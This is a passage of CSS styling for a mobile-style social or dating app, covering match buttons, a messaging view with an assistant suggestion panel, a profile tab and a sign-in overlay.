            .match-like:active {
                transform: scale(0.9);
            }
            .match-like.liked {
                background: var(--gradient);
                color: #fff;
                border-color: transparent;
                animation: like-pop 380ms ease;
            }
            @keyframes like-pop {
                0% {
                    transform: scale(1);
                }
                40% {
                    transform: scale(1.3);
                }
                100% {
                    transform: scale(1);
                }
            }
            .no-results {
                grid-column: 1 / -1;
                text-align: center;
                color: var(--text-muted);
                padding: 40px 20px;
                font-size: 14px;
            }

            /* ============================================================
     MESSAGES TAB
  ============================================================ */
            .messages-scroll {
                flex: 1;
                overflow-y: auto;
                padding: 0 8px;
            }
            .conversation {
                display: flex;
                align-items: center;
                gap: 14px;
                padding: 14px 16px;
                border-radius: 16px;
                transition: background 150ms ease;
                cursor: pointer;
                position: relative;
            }
            .conversation:hover {
                background: var(--surface-2);
            }
            .conv-avatar {
                width: 52px;
                height: 52px;
                border-radius: 50%;
                display: grid;
                place-items: center;
                color: #fff;
                font-weight: 600;
                font-size: 18px;
                flex-shrink: 0;
                letter-spacing: -0.01em;
                overflow: hidden;
            }
            img.conv-avatar {
                display: block;
            }
            .conv-content {
                flex: 1;
                min-width: 0;
            }
            .conv-head {
                display: flex;
                justify-content: space-between;
                align-items: baseline;
                margin-bottom: 2px;
            }
            .conv-name {
                font-size: 15px;
                font-weight: 600;
                letter-spacing: -0.01em;
            }
            .conv-time {
                font-size: 11.5px;
                color: var(--text-muted);
                flex-shrink: 0;
                margin-left: 8px;
            }
            .conv-preview {
                font-size: 13.5px;
                color: var(--text-muted);
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }
            .conv-unread-badge {
                min-width: 20px;
                height: 20px;
                padding: 0 6px;
                border-radius: 999px;
                background: var(--gradient);
                color: #fff;
                font-size: 11px;
                font-weight: 700;
                display: grid;
                place-items: center;
                flex-shrink: 0;
                box-shadow: 0 2px 8px rgba(124, 94, 247, 0.4);
            }
            .conv-unread .conv-preview {
                color: var(--text);
                font-weight: 500;
            }

            .chat-view {
                position: absolute;
                inset: 0;
                background: var(--bg);
                display: flex;
                flex-direction: column;
                transform: translateX(100%);
                transition: transform 280ms cubic-bezier(0.22, 0.61, 0.36, 1);
                z-index: 10;
                padding-bottom: var(--nav-height);
            }
            .chat-view.open {
                transform: translateX(0);
            }
            .chat-header {
                display: flex;
                align-items: center;
                gap: 12px;
                padding: 14px 16px;
                padding-top: calc(14px + var(--safe-top));
                border-bottom: 1px solid var(--border);
                background: rgba(19, 19, 31, 0.9);
                backdrop-filter: blur(20px);
                -webkit-backdrop-filter: blur(20px);
                z-index: 2;
            }
            .chat-back {
                width: 36px;
                height: 36px;
                border-radius: 10px;
                display: grid;
                place-items: center;
                color: var(--text);
                transition: background 150ms ease;
            }
            .chat-back:hover {
                background: var(--surface-2);
            }
            .chat-avatar {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                display: grid;
                place-items: center;
                color: #fff;
                font-weight: 600;
                font-size: 15px;
                overflow: hidden;
            }
            .chat-user {
                flex: 1;
                min-width: 0;
            }
            .chat-name {
                font-size: 15px;
                font-weight: 600;
                letter-spacing: -0.01em;
            }
            .chat-status {
                font-size: 12px;
                color: var(--success);
                display: flex;
                align-items: center;
                gap: 5px;
            }
            .chat-status::before {
                content: "";
                width: 6px;
                height: 6px;
                border-radius: 50%;
                background: var(--success);
                box-shadow: 0 0 8px var(--success);
            }
            .chat-messages {
                flex: 1;
                overflow-y: auto;
                padding: 16px;
                display: flex;
                flex-direction: column;
                gap: 6px;
            }

            .bubble-row {
                display: flex;
                align-items: center;
                gap: 8px;
                max-width: 90%;
            }
            .bubble-row.them {
                align-self: flex-start;
            }
            .bubble-row.me {
                align-self: flex-end;
                flex-direction: row-reverse;
            }
            .bubble {
                padding: 10px 14px;
                font-size: 14.5px;
                line-height: 1.4;
                border-radius: 18px;
                word-wrap: break-word;
                animation: bubble-in 260ms cubic-bezier(0.22, 0.61, 0.36, 1);
            }
            .bubble.them {
                background: var(--surface-2);
                border-bottom-left-radius: 6px;
                color: var(--text);
            }
            .bubble.me {
                background: var(--gradient);
                color: #fff;
                border-bottom-right-radius: 6px;
                box-shadow: 0 4px 14px rgba(124, 94, 247, 0.3);
            }

            .neuron-aside {
                width: 26px;
                height: 38px;
                border-radius: 999px;
                background: linear-gradient(180deg, #4f6ef7 0%, #3456e5 100%);
                box-shadow:
                    0 2px 10px rgba(79, 110, 247, 0.4),
                    inset 0 1px 0 rgba(255, 255, 255, 0.25);
                display: grid;
                place-items: center;
                color: #fff;
                flex-shrink: 0;
                transition: all 200ms ease;
                position: relative;
                overflow: visible;
            }
            .neuron-aside::before {
                content: "";
                position: absolute;
                inset: -4px;
                border-radius: 999px;
                background: radial-gradient(
                    circle,
                    rgba(139, 224, 255, 0.45),
                    transparent 65%
                );
                opacity: 0;
                transition: opacity 200ms ease;
                z-index: -1;
            }
            .neuron-aside:hover {
                transform: scale(1.08);
                box-shadow:
                    0 4px 16px rgba(124, 94, 247, 0.55),
                    inset 0 1px 0 rgba(255, 255, 255, 0.3);
            }
            .neuron-aside:hover::before {
                opacity: 1;
            }
            .neuron-aside:active {
                transform: scale(0.94);
            }
            .neuron-aside.active {
                background: linear-gradient(180deg, #7c5ef7 0%, #4f6ef7 100%);
            }
            .neuron-aside.active::before {
                opacity: 1;
            }
            .neuron-aside svg {
                width: 18px;
                height: 18px;
            }

            .neuron-context {
                align-self: flex-start;
                max-width: 92%;
                margin: 4px 0 8px 4px;
                background: linear-gradient(
                    135deg,
                    rgba(79, 110, 247, 0.08),
                    rgba(124, 94, 247, 0.1)
                );
                border: 1px solid rgba(124, 94, 247, 0.3);
                border-radius: 16px;
                padding: 12px;
                box-shadow: 0 6px 24px rgba(124, 94, 247, 0.15);
                animation: neuron-context-in 280ms
                    cubic-bezier(0.22, 0.61, 0.36, 1);
            }
            @keyframes neuron-context-in {
                from {
                    opacity: 0;
                    transform: translateY(-4px) scale(0.98);
                }
                to {
                    opacity: 1;
                    transform: translateY(0) scale(1);
                }
            }
            .neuron-context-header {
                display: flex;
                align-items: center;
                gap: 8px;
                margin-bottom: 10px;
                padding: 0 4px;
            }
            .neuron-context-avatar {
                width: 22px;
                height: 22px;
                flex-shrink: 0;
            }
            .neuron-context-title {
                font-size: 12.5px;
                font-weight: 600;
                letter-spacing: -0.01em;
                color: var(--text);
                flex: 1;
            }
            .neuron-context-title small {
                color: var(--text-muted);
                font-weight: 500;
                margin-left: 6px;
            }
            .neuron-context-close {
                width: 22px;
                height: 22px;
                border-radius: 6px;
                display: grid;
                place-items: center;
                color: var(--text-muted);
                transition: color 150ms ease;
            }
            .neuron-context-close:hover {
                color: var(--text);
            }
            .neuron-context-actions {
                display: flex;
                flex-direction: column;
                gap: 6px;
            }
            .neuron-context-action {
                width: 100%;
                padding: 11px 12px;
                border-radius: 10px;
                background: rgba(255, 255, 255, 0.04);
                border: 1px solid rgba(255, 255, 255, 0.06);
                text-align: left;
                font-size: 13px;
                font-weight: 500;
                color: var(--text);
                display: flex;
                align-items: center;
                gap: 10px;
                transition: all 150ms ease;
            }
            .neuron-context-action:hover {
                background: rgba(124, 94, 247, 0.12);
                border-color: rgba(124, 94, 247, 0.35);
                transform: translateX(2px);
            }
            .neuron-context-action-icon {
                font-size: 15px;
                flex-shrink: 0;
                opacity: 0.85;
            }
            .neuron-context-response {
                padding: 4px 6px 2px;
                font-size: 13.5px;
                line-height: 1.55;
                color: var(--text);
            }
            .neuron-context-response p {
                margin: 0 0 8px;
            }
            .neuron-context-response p:last-child {
                margin-bottom: 0;
            }
            .neuron-context-response .suggestion {
                display: block;
                margin-top: 6px;
                padding: 10px 12px;
                border-radius: 10px;
                background: rgba(255, 255, 255, 0.04);
                border: 1px solid rgba(255, 255, 255, 0.07);
                font-style: italic;
                color: var(--text);
            }
            .neuron-context-response .suggestion-label {
                display: block;
                font-style: normal;
                font-size: 11px;
                color: var(--accent-cyan);
                font-weight: 600;
                letter-spacing: 0.04em;
                text-transform: uppercase;
                margin-bottom: 4px;
            }
            .neuron-context-response .synapse-line {
                display: flex;
                align-items: center;
                gap: 6px;
                margin-top: 8px;
                padding: 8px 10px;
                border-radius: 10px;
                background: rgba(139, 224, 255, 0.08);
                border: 1px solid rgba(139, 224, 255, 0.25);
                color: var(--accent-cyan);
                font-weight: 600;
            }
            .neuron-context-back {
                display: inline-flex;
                align-items: center;
                gap: 4px;
                margin-top: 10px;
                padding: 6px 10px;
                border-radius: 999px;
                background: rgba(255, 255, 255, 0.04);
                border: 1px solid rgba(255, 255, 255, 0.07);
                font-size: 12px;
                color: var(--text-muted);
                transition: all 150ms ease;
            }
            .neuron-context-back:hover {
                color: var(--text);
                border-color: var(--border-strong);
            }

            .chat-input-row {
                display: flex;
                align-items: center;
                gap: 10px;
                padding: 12px 16px;
                border-top: 1px solid var(--border);
                background: var(--surface);
            }
            .chat-input {
                flex: 1;
                padding: 12px 16px;
                border-radius: 14px;
                background: var(--surface-2);
                border: 1px solid var(--border);
                font-size: 14.5px;
                color: var(--text);
                transition: border-color 150ms ease;
                min-width: 0;
            }
            .chat-input:focus {
                border-color: var(--accent);
            }
            .chat-send {
                width: 44px;
                height: 44px;
                border-radius: 14px;
                background: var(--gradient);
                color: #fff;
                display: grid;
                place-items: center;
                flex-shrink: 0;
                box-shadow: 0 4px 14px rgba(124, 94, 247, 0.35);
                transition: all 150ms ease;
            }
            .chat-send:hover {
                transform: scale(1.05);
            }
            .chat-send:active {
                transform: scale(0.92);
            }

            /* ============================================================
     PROFILE TAB
  ============================================================ */
            .profile-scroll {
                flex: 1;
                overflow-y: auto;
                padding: 0 20px 20px;
            }
            .profile-hero {
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 12px;
                padding: 8px 0 24px;
            }
            .profile-avatar-big {
                width: 110px;
                height: 110px;
                border-radius: 50%;
                background: var(--gradient);
                display: grid;
                place-items: center;
                color: #fff;
                font-size: 42px;
                font-weight: 700;
                letter-spacing: -0.02em;
                box-shadow: 0 12px 40px rgba(124, 94, 247, 0.35);
                position: relative;
            }
            .profile-avatar-big::after {
                content: "";
                position: absolute;
                inset: -3px;
                border-radius: 50%;
                background: var(--gradient);
                filter: blur(16px);
                opacity: 0.35;
                z-index: -1;
            }
            .profile-name-big {
                font-size: 24px;
                font-weight: 700;
                letter-spacing: -0.02em;
                text-align: center;
                margin: 6px 0 0;
            }
            .profile-meta {
                color: var(--text-muted);
                font-size: 14px;
                display: flex;
                align-items: center;
                gap: 6px;
            }
            .profile-tagline {
                font-size: 14px;
                color: var(--text);
                text-align: center;
                font-style: italic;
                margin: 4px 0 0;
                padding: 10px 16px;
                background: var(--surface-2);
                border: 1px solid var(--border);
                border-radius: 14px;
            }
            .profile-section {
                background: var(--surface);
                border: 1px solid var(--border);
                border-radius: 18px;
                padding: 18px;
                margin-bottom: 14px;
            }
            .section-title {
                font-size: 15px;
                font-weight: 600;
                letter-spacing: -0.01em;
                margin: 0 0 14px;
                display: flex;
                align-items: center;
                justify-content: space-between;
            }
            .passion-grid {
                display: flex;
                flex-wrap: wrap;
                gap: 8px;
            }
            .passion-pill {
                padding: 8px 14px;
                border-radius: 999px;
                background: var(--surface-2);
                border: 1px solid var(--border);
                font-size: 13px;
                font-weight: 500;
                transition: all 150ms ease;
                cursor: pointer;
            }
            .passion-pill:hover {
                border-color: var(--border-strong);
            }
            .passion-add {
                background: transparent;
                border: 1px dashed var(--border-strong);
                color: var(--text-muted);
            }
            .passion-add:hover {
                color: var(--accent-2);
                border-color: var(--accent-2);
            }
            .progress-head {
                display: flex;
                align-items: baseline;
                justify-content: space-between;
                margin-bottom: 10px;
            }
            .progress-percent {
                font-size: 22px;
                font-weight: 700;
                background: var(--gradient);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                letter-spacing: -0.02em;
            }
            .progress-track {
                height: 8px;
                border-radius: 999px;
                background: var(--surface-2);
                overflow: hidden;
            }
            .progress-fill {
                height: 100%;
                background: var(--gradient);
                border-radius: 999px;
                width: 75%;
                box-shadow: 0 0 12px rgba(124, 94, 247, 0.5);
                transition: width 500ms ease;
            }
            .progress-caption {
                font-size: 12.5px;
                color: var(--text-muted);
                margin: 10px 0 16px;
            }
            .checklist {
                display: flex;
                flex-direction: column;
                gap: 10px;
            }
            .checklist-item {
                display: flex;
                align-items: center;
                gap: 12px;
                font-size: 13.5px;
            }
            .checklist-icon {
                width: 22px;
                height: 22px;
                border-radius: 50%;
                flex-shrink: 0;
                display: grid;
                place-items: center;
            }
            .checklist-item.done .checklist-icon {
                background: var(--success);
                color: #0d0d14;
            }
            .checklist-item.todo .checklist-icon {
                background: transparent;
                border: 1.5px solid var(--border-strong);
            }
            .checklist-item.todo {
                color: var(--text-muted);
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 10px;
            }
            .stat-card {
                background: var(--surface-2);
                border: 1px solid var(--border);
                border-radius: 14px;
                padding: 14px 10px;
                text-align: center;
            }
            .stat-value {
                font-size: 22px;
                font-weight: 700;
                letter-spacing: -0.02em;
                background: var(--gradient);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                margin-bottom: 2px;
            }
            .stat-label {
                font-size: 11.5px;
                color: var(--text-muted);
                font-weight: 500;
            }
            .btn-logout {
                width: 100%;
                padding: 14px 20px;
                border-radius: 14px;
                background: transparent;
                border: 1px solid rgba(247, 79, 110, 0.35);
                color: var(--danger);
                font-size: 14px;
                font-weight: 600;
                margin-top: 12px;
                transition: all 150ms ease;
            }
            .btn-logout:hover {
                background: rgba(247, 79, 110, 0.08);
                border-color: var(--danger);
            }

            /* ============================================================
     AUTH OVERLAY
  ============================================================ */
            .auth-overlay {
                position: fixed;
                inset: 0;
                z-index: 200;
                background: var(--bg);
                display: flex;
                flex-direction: column;
                overflow-y: auto;
                padding: calc(var(--safe-top) + 40px) 24px
                    calc(var(--safe-bottom) + 24px);
            }
            @media (min-width: 500px) {
                .auth-overlay {
                    position: absolute;
                    border-radius: 36px;
                    max-width: var(--app-max-width);
                    margin: max(0px, calc((100dvh - 900px) / 2)) auto 0;
                    height: min(900px, 100dvh);
                    inset: auto;
                    left: 0;
                    right: 0;
                }
            }
            .auth-brand {
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 14px;
                margin-bottom: 32px;
            }
            .auth-brand-mascot {
                width: 88px;
                height: 88px;
            }
            .auth-title {
                font-size: 26px;
                font-weight: 700;
                letter-spacing: -0.025em;
                margin: 0;
                background: linear-gradient(180deg, #fff 0%, #c7c7e8 100%);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
            }
            .auth-subtitle {
                color: var(--text-muted);
                font-size: 14px;
                margin: 0;
                text-align: center;
                max-width: 300px;
            }
            .auth-card {
                background: var(--surface);
                border: 1px solid var(--border);
                border-radius: 20px;
                padding: 24px 20px;
                display: flex;
                flex-direction: column;
                gap: 14px;
            }
            .auth-oauth {
                display: flex;
                flex-direction: column;
                gap: 10px;
            }
            .auth-oauth-btn {
                width: 100%;
                padding: 13px 16px;
                border-radius: 12px;
                background: var(--surface-2);
                border: 1px solid var(--border-strong);
                color: var(--text);
                font-size: 14px;
                font-weight: 600;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                transition: all 150ms ease;
            }
            .auth-oauth-btn:hover {
                background: var(--surface-3);
                transform: translateY(-1px);
            }
            .auth-oauth-btn svg {
                width: 18px;
                height: 18px;
            }
            .auth-divider {
                display: flex;
                align-items: center;
                gap: 12px;
                color: var(--text-faint);
                font-size: 12px;
                text-transform: uppercase;
                letter-spacing: 0.08em;
            }
            .auth-divider::before,
            .auth-divider::after {
                content: "";
                flex: 1;
                height: 1px;
                background: var(--border);
            }
            .auth-field {
                display: flex;
                flex-direction: column;
                gap: 6px;
            }
            .auth-label {
                font-size: 12px;
                color: var(--text-muted);
                font-weight: 500;
                letter-spacing: 0.02em;
            }
            .auth-input {
                width: 100%;
                padding: 13px 14px;
                border-radius: 12px;
                background: var(--surface-2);
                border: 1px solid var(--border);
                color: var(--text);
                font-size: 14px;
                transition: border-color 150ms ease;
            }
            .auth-input:focus {
                border-color: var(--accent);
            }
            .auth-submit {
                width: 100%;
